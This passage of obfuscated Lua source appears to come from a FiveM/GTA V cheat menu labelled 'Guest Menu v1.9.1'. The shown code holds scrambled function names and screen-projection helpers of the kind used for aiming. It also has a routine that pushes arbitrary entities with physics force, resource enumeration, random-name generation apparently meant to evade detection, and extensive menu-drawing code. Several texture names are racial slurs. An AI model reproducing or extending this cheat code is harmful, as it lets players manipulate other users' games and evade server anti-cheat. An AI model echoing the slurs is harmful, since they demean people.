    local bv = 0.0
    local bw = I.NewFunction.lpdfiodsjqshudvazaerz(bq)
    local bx = vector3(bq.x + 10.0, bq.y + 0.0, bq.z + 0.0)
    local by = vector3(bq.x - 10.0, bq.y + 0.0, bq.z + 0.0)
    local bz = vector3(bq.x, bq.y + 0.0, bq.z + -10.0)
    local bA =
        I.NewFunction.lpdfiodsjqshudvazaerz(vector3(bq.x, bq.y + 0.0, bq.z + 10.0)) -
        I.NewFunction.lpdfiodsjqshudvazaerz(bz)
    local bB = I.NewFunction.lpdfiodsjqshudvazaerz(bx) - I.NewFunction.lpdfiodsjqshudvazaerz(by)
    local bC =
        -d.Main.GuestMath.GuestRad(bq.y)
    vect33 =
        bA *
        d.Main.GuestMath.GuestCos(bC) -
        bB *
            d.Main.GuestMath.GuestSin(
                bC
            )
    vect34 =
        bA *
        d.Main.GuestMath.GuestSin(bC) -
        bB *
            d.Main.GuestMath.GuestCos(
                bC
            )
    local bD, x1, y1 = I.NewFunction.jdgiohjsiughqfsiguhqdg(br + bw * 10.0 + vect33 + vect34)
    if not bD then
        bs = x1
        bt = y1
        return br + bw * 10.0
    end
    local bE, x2, y2 = I.NewFunction.jdgiohjsiughqfsiguhqdg(br + bw * 10.0)
    if not bE then
        bv = x2
        bu = y2
        return br + bw * 10.0
    end
    if
        d.Main.GuestMath.GuestAbs(
            bs - bv
        ) < 0.001 or
            d.Main.GuestMath.GuestAbs(
                bt - bu
            ) < 0.001
     then
        return br + bw * 10.0
    end
    local x = (bp.x - bv) / (bs - bv)
    local y = (bp.y - bu) / (bt - bu)
    return br + bw * 10.0 + vect33 * x + vect34 * y
end
I.NewFunction.zfqdisfhqisfhzifhze = function(bF, bG)
    return vector3(bF.x - bG.x, bF.y - bG.y, bF.z - bG.z)
end
I.NewFunction.fjqdisfhqdsiughqdsfg = function()
    local bH = GetGameplayCamCoord()
    local bI = I.NewFunction.sdfjdijsfhdsfhdsfq(0, 0)
    local bJ = I.NewFunction.zfqdisfhqisfhzifhze(bI, bH)
    return bJ
end
I.NewFunction.jdgiohjsiughqfsiguhqdg = function(bK)
    local bL, x, y =
        d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
        bK.x,
        bK.y,
        bK.z
    )
    if not bL then
        return false
    end
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end
I.NewFunction.sfvjdsqiofgjqdsofhqsziuhfhz = function(bM)
    local rgb = {}
    local bd = GetGameTimer() / 200
    rgb.r =
        d.Main.GuestMath.GuestFloor(
        d.Main.GuestMath.GuestSin(
            bd * bM + 0
        ) *
            127 +
            128
    )
    rgb.g =
        d.Main.GuestMath.GuestFloor(
        d.Main.GuestMath.GuestSin(
            bd * bM + 2
        ) *
            127 +
            128
    )
    rgb.b =
        d.Main.GuestMath.GuestFloor(
        d.Main.GuestMath.GuestSin(
            bd * bM + 4
        ) *
            127 +
            128
    )
    return rgb
end
I.NewFunction.qdsfipqjsgioqzhjgoqhg = function(bN)
    for b7 = 1, #I.FunctionTables.weaponsModels do
        if GetHashKey(I.FunctionTables.weaponsModels[b7]) == bN then
            return d.Main.GuestString.GuestSub(
                I.FunctionTables.weaponsModels[b7],
                8
            )
        end
    end
end
I.NewFunction.ggdsngdsfysazeazty = function(bO, bP)
    return vector3(bO.x * bP, bO.y * bP, bO.z * bP)
end
I.NewFunction.lodfdsfuaazratfe = function(bF, bG)
    return vector3(bF.x + bG.x, bF.y + bG.y, bF.z + bG.z)
end
I.NewFunction.dsfndsifgqbqz = function(coords, bQ)
    return vector3(coords.x * bQ, coords.y * bQ, coords.z * bQ)
end
I.NewFunction.gdskofjqsiuaghdyzgergerg = function(entity, bR, bS, bT)
    local bU = I.NewFunction.ggdsngdsfysazeazty(I.NewFunction.zfqdisfhqisfhzifhze(bR, GetEntityCoords(entity)), bS * bS)
    local bV =
        I.NewFunction.lodfdsfuaazratfe(
        I.NewFunction.ggdsngdsfysazeazty(GetEntityVelocity(entity), 2.0 * bS * bT),
        vector3(0.0, 0.0, 0.1)
    )
    local bW = I.NewFunction.zfqdisfhqisfhzifhze(bU, bV)
    ApplyForceToEntity(entity, 3, bW, 0, 0, 0, false, false, true, true, false, true)
end
I.NewFunction.sdfibdsfuyeazgazeaz = function(bX, bY)
    local bZ = bX.x
    local b_ = bX.y
    local c0 = bX.z
    local c1 = bY.x
    local c2 = bY.y
    local c3 = bY.z
    local c4 = c1 - bZ
    local c5 = c2 - b_
    local c6 = c3 - c0
    local y2 = c5 * c5
    local x2 = c4 * c4
    local c7 = y2 + x2
    return d.Main.GuestMath.GuestSqrt(
        c7 + c6
    )
end
I.NewFunction.qsbdfqsudgqsdfgqadz = function(c8, c9)
    local c8 = RequestScaleformMovie(c8)
    while not HasScaleformMovieLoaded(c8) do
        d.Main.GuestWait(1)
    end
    PushScaleformMovieFunction(c8, "SHOW_SHARD_WASTED_MP_MESSAGE")
    PushScaleformMovieFunctionParameterString(c9)
    PopScaleformMovieFunctionVoid()
    return c8
end
I.NewFunction.qfhsiufezy_fhzqdze = function(H, ca)
    return d.Main.GuestToNum(
        string.format("%." .. (ca or 0) .. "f", H)
    )
end
I.NewFunction.e6e59332a9c38c68fcc442343821f4f9 = function(cb, cc)
    for b7 = 1, #cb do
        if cb[b7] == cc then
            d.Main.GuestTable.GuestRemove(
                cb,
                b7
            )
        end
    end
end
I.NewFunction.a6e5dfdc2835e14ec7fa65a5cc742b = function(table, cc)
    for cd, bb in pairs(table) do
        if bb == cc then
            return true
        end
    end
    return false
end
do
    local cf = {}
    local cg = {}
    for b7 = 48, 57 do
        d.Main.GuestTable.GuestInsert(
            cf,
            d.Main.GuestString.GuestChar(
                b7
            )
        )
    end
    for b7 = 65, 90 do
        d.Main.GuestTable.GuestInsert(
            cg,
            d.Main.GuestString.GuestChar(
                b7
            )
        )
    end
    for b7 = 97, 122 do
        d.Main.GuestTable.GuestInsert(
            cg,
            d.Main.GuestString.GuestChar(
                b7
            )
        )
    end
    I.NewFunction.a47fd66c141b06eb90c77c8cfb1dd3cb = function(l)
        d.Main.GuestWait(0)
        d.Main.GuestMath.GuestRandseed(
            GetGameTimer()
        )
        if l > 0 then
            return I.NewFunction.a47fd66c141b06eb90c77c8cfb1dd3cb(l - 1) ..
                cf[
                    d.Main.GuestMath.GuestRand(
                        1,
                        #cf
                    )
                ]
        else
            return ""
        end
    end
    I.NewFunction.a1fa3be3614abf8c650e659bab68d0f2 = function(l)
        d.Main.GuestWait(0)
        d.Main.GuestMath.GuestRandseed(
            GetGameTimer()
        )
        if l > 0 then
            return I.NewFunction.a1fa3be3614abf8c650e659bab68d0f2(l - 1) ..
                cg[
                    d.Main.GuestMath.GuestRand(
                        1,
                        #cg
                    )
                ]
        else
            return ""
        end
    end
end
I.NewFunction.c9f328ef7b30553a6705e827855bd30c = function(ch, ci, cj)
    I.natives.addTextEntry("FMMC_KEY_TIP1", ch .. ":")
    I.natives.displayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ci, "", "", "", cj)
    blockinput = true
    while I.natives.updateOnscreenKeyboard() ~= 1 and I.natives.updateOnscreenKeyboard() ~= 2 do
        d.Main.GuestWait(0)
    end
    if I.natives.updateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        d.Main.GuestWait(500)
        blockinput = false
        return result
    else
        d.Main.GuestWait(500)
        blockinput = false
        return nil
    end
end
I.NewFunction.posfazeazedanada = function(ck)
    local cl = GetEntityMaxHealth(ck)
    local cm = GetEntityHealth(ck)
    if cm >= 1 then
        return " [~g~Alive~m~] [~g~" .. cm .. "~m~/~g~" .. cl .. "~m~]"
    else
        return " [~r~Dead~m~] [~r~" .. cm .. "~m~/~r~" .. cl .. "~m~]"
    end
end
I.NewFunction.d99a8e7f010c9f33f11485c499d1af68 = function()
    local cn = {}
    for b7 = 0, GetNumResources() do
        cn[b7] = GetResourceByFindIndex(b7)
    end
    return cn
end
function I.c6b66f5c83c5739fa64558753033d13(L)
    if I.debug then
        Citizen.Trace(
            "[g" .. "uest] " .. d.Main.GuestToString(L) .. ".\n"
        )
    end
end
local co = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}
function I.setMenuProperty(aW, cp, bb)
    if aW and I.GuestCurrentUI.GuestShit[aW] then
        I.GuestCurrentUI.GuestShit[aW][cp] = bb
        I.c6b66f5c83c5739fa64558753033d13(
            aW ..
                " menu property changed: { " ..
                    d.Main.GuestToString(cp) ..
                        ", " .. d.Main.GuestToString(bb) .. " }"
        )
    end
end
function GetTextWidthS(string, J, au)
    J = J or 4
    au = au or 0.35
    I.Cache[J] = I.Cache[J] or {}
    I.Cache[J][au] = I.Cache[J][au] or {}
    if I.Cache[J][au][string] then
        return I.Cache[J][au][string].length
    end
    Citizen.InvokeNative(0x54CE8AC98E120CAB, "STRING")
    Citizen.InvokeNative(0x6C188BE134E074AA, string)
    Citizen.InvokeNative(0x66E0276CC5F6B9DA, J or 4)
    Citizen.InvokeNative(0x07C837F9A01C34C9, au or 0.35, au or 0.35)
    local l = Citizen.InvokeNative(0x85F061DA64ED2F67, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
    I.Cache[J][au][string] = {length = l}
    return l
end
function I.GetTextWidth(string, J, au)
    return GetTextWidthS(string, J, au)
end
function I.isMenuVisible(aW)
    if aW and I.GuestCurrentUI.GuestShit[aW] then
        return I.GuestCurrentUI.GuestShit[aW].visible
    else
        return false
    end
end
function I.e1f7840a0e42a66ce28aaf37700(aW, cq, cr)
    if aW and I.GuestCurrentUI.GuestShit[aW] then
        I.setMenuProperty(aW, "visible", cq)
        if not cr and I.GuestCurrentUI.GuestShit[aW] then
            I.setMenuProperty(aW, "currentOption", 1)
        end
        if cq then
            if
                aW ~= I.GuestCurrentUI.currentMenu and
                    I.isMenuVisible(I.GuestCurrentUI.currentMenu)
             then
                I.e1f7840a0e42a66ce28aaf37700(I.GuestCurrentUI.currentMenu, false)
            end
            I.GuestCurrentUI.currentMenu = aW
        end
    end
end
function I.DrawTxt(L, x, y, au, av, color)
    I.natives.setTextColour(color.r, color.g, color.b, color.a)
    I.natives.setTextFont(4)
    SetTextCentre()
    I.natives.setTextProportional(1)
    I.natives.setTextScale(au, av)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 255)
    I.natives.setTextDropShadow()
    if I.GuestCurrentUI.menu_TextOutline then
        I.natives.setTextOutline()
    end
    I.natives.beginTextCommandDisplayText("STRING")
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.endTextCommandDisplayText(x, y)
end
function I.DrawSomeText(L, J, cs, x, y, au, r, g, b, a)
    I.natives.setTextFont(4)
    I.natives.setTextScale(au, au)
    SetTextCentre()
    I.natives.setTextColour(I.rgb.r, I.rgb.g, I.rgb.b, I.rgb.a)
    I.natives.beginTextCommandDisplayText("STRING")
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.endTextCommandDisplayText(x, y)
end
function I.HoverOn(x, y, ct, cu)
    local ct
    local cv, cw = GetNuiCursorPosition()
    if cv >= x and cv <= x + ct and cw >= y and cw <= y + cu then
        return true
    else
        return false
    end
end
function I.FindWidth(L, J, au)
    I.natives.beginTextCommandDisplayText("STRING")
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.setTextFont(J)
    I.natives.setTextScale(au, au)
    local l = I.natives.EndTextCommandGetWidth(1)
    local cA, cd = I.natives.GetActiveScreenResolution()
end
function I.round(bd)
    return bd % 1 >= 0.5 and d.Main.GuestMath.GustCeli(bd) or
        d.Main.GuestMath.GuestFloor(bd)
end
function I.DrawText2(L, cB, cC, av, J, cD, cE, cF)
    x, y = table.unpack(cB)
    r, g, b, a = table.unpack(cC)
    menu =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ]
    SetTextFont(J)
    SetTextProportional(1)
    SetTextScale(av, av)
    if cF then
        SetTextDropshadow(1, 0, 0, 0, 255)
        SetTextEdge(1, 0, 0, 0, 255)
        SetTextDropShadow()
        SetTextOutline()
    end
    SetTextColour(r, g, b, a)
    if cD == 1 then
        SetTextCentre(1)
    elseif cD == 2 then
        if menu then
            SetTextWrap(menu.x, menu.x + menu.width - 0.005)
        end
        SetTextRightJustify(true)
    elseif cD == 3 then
        if menu then
            SetTextWrap(menu.x, menu.x + menu.width - 0.022)
        end
        SetTextRightJustify(true)
    elseif cD == 4 then
        if menu then
            SetTextWrap(0.0, -1.0)
        end
    end
    if type(cE) == "string" then
        AddTextEntry(cE, L)
        SetTextEntry(cE)
    else
        SetTextEntry("STRING")
    end
    AddTextComponentString(L)
    DrawText(x, y)
end
function I.drawText(L, x, y, J, color, au, cG, cH, cI)
    I.natives.setTextColour(color.r, color.g, color.b, color.a)
    if I.GuestCurrentUI.menu_TextDropShadow then
        I.natives.setTextDropShadow(0, 0, 0, 0, 255)
    end
    SetTextEdge(2, 0, 0, 0, 255)
    if I.GuestCurrentUI.menu_TextOutline then
        I.natives.setTextOutline()
    end
    I.natives.setTextFont(J)
    I.natives.setTextScale(au, au)
    if cH then
        I.natives.setTextDropShadow(2, 2, 0, 0, 0)
    end
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        if cG then
            SetTextCentre(cG)
        elseif cI then
            SetTextWrap(
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x +
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].width -
                    I.GuestCurrentUI.buttonTextXOffset
            )
            SetTextRightJustify(true)
        end
    end
    I.natives.beginTextCommandDisplayText("STRING")
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.endTextCommandDisplayText(x, y)
end
function I.DrawRect(x, y, width, height, color)
    I.natives.DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end
local cJ =
    d.Main.GuestCreateRuntimeTxd(
    "VertissoTrapersksk"
)
local cK =
    d.Main.GuestCreateRuntimeTxd(
    "Vertissodafuq"
)
local cL =
    d.Main.GuestCreateRuntimeTxd(
    "Kysnnmen"
)
local cM =
    d.Main.GuestCreateRuntimeTxd(
    "negus"
)
local cN =
    d.Main.GuestCreateRuntimeTxd(
    "ligma"
)
local cO =
    d.Main.GuestCreateRuntimeTxd(
    "candice"
)
local cP =
    d.Main.GuestCreateRuntimeTxd(
    "idkfuckthismenutbh"
)
local cQ =
    d.Main.GuestCreateRuntimeTxd(
    "wtfamidoinghere"
)
local cR =
    d.Main.GuestCreateRuntimeTxd(
    "nigerus"
)
local cS =
    CreateDui(
    "https://media.discordapp.net/attachments/862697887513968641/866025623721738310/bluecomplete.png",
    512,
    128
)
local cT =
    CreateDui(
    "https://media.discordapp.net/attachments/862697887513968641/866025626497843200/greencomplete.png",
    512,
    128
)
local cU =
    CreateDui(
    "https://media.discordapp.net/attachments/862697887513968641/866025629401088020/orangecomplete.png",
    512,
    128
)
local cV =
    CreateDui(
    "https://media.discordapp.net/attachments/862697887513968641/866025633346748466/redcomplete.png",
    512,
    128
)
local cW =
    CreateDui(
    "https://media.discordapp.net/attachments/862697887513968641/866025632370917406/purplecomplete.png",
    512,
    128
)
local cX =
    CreateDui(
    "https://cdn.discordapp.com/attachments/702171812645306488/866075090008145940/MOSHED-2021-7-17-23-52-10.gif",
    512,
    128
)
local cY =
    CreateDui(
    "https://cdn.discordapp.com/attachments/772437174946758686/868294386734235739/officialheader.gif",
    512,
    128
)
local cZ =
    CreateDui("https://cdn.discordapp.com/attachments/751854076563816498/867174564222992394/Sans_titre-1.png", 512, 128)
local c_ =
    CreateDui("https://cdn.discordapp.com/attachments/702171812645306488/868645279975489577/header2.gif", 512, 128)
_G.HeaderBlue = cS
_G.HeaderGreen = cT
_G.HeaderOrange = cU
_G.HeaderRed = cV
_G.HeaderPurple = cW
_G.HeaderRGB = cX
_G.HeaderOriginal = cY
_G.SomeShitOfTik = cZ
_G.HeaderLite = c_
local d0 = d.Main.GuestGetDuiHandle(cS)
local d1 = d.Main.GuestGetDuiHandle(cT)
local d2 = d.Main.GuestGetDuiHandle(cU)
local d3 = d.Main.GuestGetDuiHandle(cV)
local d4 = d.Main.GuestGetDuiHandle(cW)
local d5 = d.Main.GuestGetDuiHandle(cX)
local d6 = d.Main.GuestGetDuiHandle(cY)
local d7 = d.Main.GuestGetDuiHandle(cZ)
local d8 = d.Main.GuestGetDuiHandle(c_)
local d9 =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cJ,
    "GuestHeader",
    d0
)
local da =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cK,
    "GuestHeader2",
    d1
)
local db =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cL,
    "GuestHeader3",
    d2
)
local dc =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cM,
    "GuestHeader4",
    d3
)
local dd =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cN,
    "GuestHeader5",
    d4
)
local de =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cO,
    "GuestHeader6",
    d5
)
local df =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cP,
    "GuestHeader7",
    d6
)
local dg =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cQ,
    "SomeShitOfTik",
    d7
)
local dh =
    d.Main.GuestCreateRuntimeTextureFromDuiHandle(
    cR,
    "HeaderLite",
    d8
)
function I.ef538a86f538097()
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        local x =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].x +
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width /
                2
        local di =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].x +
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width *
                I.GuestCurrentUI.titleXOffset
        local y =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].y +
            I.GuestCurrentUI.titleHeight * 1 /
                I.GuestCurrentUI.titleSpacing
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].titleBackgroundSprite
         then
            DrawSprite(
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].titleBackgroundSprite.dict,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].titleBackgroundSprite.name,
                x,
                y,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].width,
                I.GuestCurrentUI.titleHeight,
                0.0,
                I.mainColor.r,
                I.mainColor.g,
                I.mainColor.b,
                255
            )
        else
            I.DrawSprite(
                "Guest5",
                "GuestHeader5",
                0.155,
                0.11,
                0.25,
                0.1,
                0.0,
                I.rgb.r,
                I.rgb.g,
                I.rgb.b,
                255
            )
            I.DrawRect(
                x,
                y,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].width,
                I.GuestCurrentUI.titleHeight,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].titleBackgroundColor
            )
        end
        I.drawText(
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].title,
            di,
            y - I.GuestCurrentUI.titleHeight / 2 +
                I.GuestCurrentUI.titleYOffset,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].titleFont,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].titleColor,
            I.GuestCurrentUI.titleScale,
            true
        )
        I.drawText(
            I.GuestCurrentUI._mVersion,
            di + 0.2,
            y - I.GuestCurrentUI.titleHeight / 2 +
                I.GuestCurrentUI.titleYOffset +
                0.020,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].titleFont,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].titleColor,
            I.GuestCurrentUI.titleScale - 0.3,
            true
        )
    end
end
function I.b56c29383a6b8f4877()
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ]
     then
        local x =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].x +
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width /
                2
        local y =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].y +
            I.GuestCurrentUI.titleHeight +
            I.GuestCurrentUI.buttonHeight / 2
        local dj = {r = I.mainColor.r, g = I.mainColor.g, b = I.mainColor.b, a = 255}
        I.DrawRect(
            x,
            y,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width,
            I.GuestCurrentUI.buttonHeight,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].subTitleBackgroundColor
        )
        I.drawText(
            "	               	    	 Guest Menu v1.9.1",
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].x + I.GuestCurrentUI.buttonTextXOffset,
            y - I.GuestCurrentUI.buttonHeight / 2 +
                I.GuestCurrentUI.buttonTextYOffset,
            I.GuestCurrentUI.buttonFont,
            dj,
            I.GuestCurrentUI.buttonScale,
            false
        )
        if
            I.GuestCurrentUI.optionCount >
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount
         then
            I.drawText(
                d.Main.GuestToString(
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].currentOption
                ) ..
                    " / " ..
                        d.Main.GuestToString(
                            I.GuestCurrentUI.optionCount
                        ),
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x +
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].width,
                y - I.GuestCurrentUI.buttonHeight / 2 +
                    I.GuestCurrentUI.buttonTextYOffset,
                I.GuestCurrentUI.buttonFont,
                dj,
                I.GuestCurrentUI.buttonScale,
                false,
                false,
                true
            )
        end
    end
end
function I.drawButton(dk, L, dl, dm)
    local x =
        I.GuestCurrentUI.GuestShit[
        I.GuestCurrentUI.currentMenu
    ].x +
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].width /
            2
    local dn = nil
    if
        I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].currentOption <=
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount
     then
        dn = I.GuestCurrentUI.optionCount
    elseif
        I.GuestCurrentUI.optionCount >
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount and
            I.GuestCurrentUI.optionCount <=
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].currentOption
     then
        dn =
            I.GuestCurrentUI.optionCount -
            (I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption -
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].maxOptionCount)
    end
    if dn then
        local y =
            I.GuestCurrentUI.GuestShit[
            I.GuestCurrentUI.currentMenu
        ].y +
            I.GuestCurrentUI.titleHeight +
            I.GuestCurrentUI.buttonHeight +
            I.GuestCurrentUI.buttonHeight * dn -
            I.GuestCurrentUI.buttonHeight / 2
        local dp = nil
        local dq = nil
        local dr = nil
        local cH = false
        if
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].currentOption == I.GuestCurrentUI.optionCount
         then
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuFocusTextColor
            dr = {r = I.mainColor.r, g = I.mainColor.g, b = I.mainColor.b, a = 255}
        else
            dp =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuBackgroundColor
            dq =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuTextColor
            dr =
                I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].menuSubTextColor
            cH = true
        end
        I.DrawRect(
            x,
            y,
            I.GuestCurrentUI.GuestShit[
                I.GuestCurrentUI.currentMenu
            ].width,
            I.GuestCurrentUI.buttonHeight,
            dp
        )
        if dm then
            if not HasStreamedTextureDictLoaded(dm.dict) then
                I.natives.RequestStreamedTextureDict(dm.dict, true)
            end
            if I.GuestCurrentUI.menu_TextOutline then
                DrawSprite(
                    dm.dict,
                    dm.text,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].x +
                        I.GuestCurrentUI.buttonTextXOffset +
                        0.008,
                    y - I.GuestCurrentUI.buttonHeight / 2 +
                        I.GuestCurrentUI.buttonTextYOffset +
                        0.0125,
                    0.0275,
                    0.0375,
                    0.0,
                    0,
                    0,
                    0,
                    255
                )
            end
            if I.GuestCurrentUI.selectedUI ~= "Classic" then
                DrawSprite(
                    dm.dict,
                    dm.text,
                    I.GuestCurrentUI.GuestShit[
                        I.GuestCurrentUI.currentMenu
                    ].x +
                        I.GuestCurrentUI.buttonTextXOffset +
                        0.008,
                    y - I.GuestCurrentUI.buttonHeight / 2 +
                        I.GuestCurrentUI.buttonTextYOffset +
                        0.0125,
                    0.0255,
                    0.0355,
                    0.0,
                    I.mainColor.r,
                    I.mainColor.g,
                    I.mainColor.b,
                    155
                )
            end
            DrawSprite(
                dm.dict,
                dm.text,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x +
                    I.GuestCurrentUI.buttonTextXOffset +
                    0.008,
                y - I.GuestCurrentUI.buttonHeight / 2 +
                    I.GuestCurrentUI.buttonTextYOffset +
                    0.0125,
                0.0225,
                0.0325,
                0.0,
                dm.color.r,
                dm.color.g,
                dm.color.b,
                255
            )
            I.drawText(
                L,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x +
                    I.GuestCurrentUI.buttonTextXOffset +
                    0.018,
                y - I.GuestCurrentUI.buttonHeight / 2 +
                    I.GuestCurrentUI.buttonTextYOffset,
                I.GuestCurrentUI.buttonFont,
                dq,
                I.GuestCurrentUI.buttonScale,
                false,
                cH
            )
        else
            I.drawText(
                L,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x + I.GuestCurrentUI.buttonTextXOffset,
                y - I.GuestCurrentUI.buttonHeight / 2 +
                    I.GuestCurrentUI.buttonTextYOffset,
                I.GuestCurrentUI.buttonFont,
                dq,
                I.GuestCurrentUI.buttonScale,
                false,
                cH
            )
        end
        if dl then
            I.drawText(
                dl,
                I.GuestCurrentUI.GuestShit[
                    I.GuestCurrentUI.currentMenu
                ].x + I.GuestCurrentUI.buttonTextXOffset,
                y - I.GuestCurrentUI.buttonHeight / 2 +
                    I.GuestCurrentUI.buttonTextYOffset,
                I.GuestCurrentUI.buttonFont,
                dr,
                I.GuestCurrentUI.buttonScale,
                false,
                cH,
                true
            )
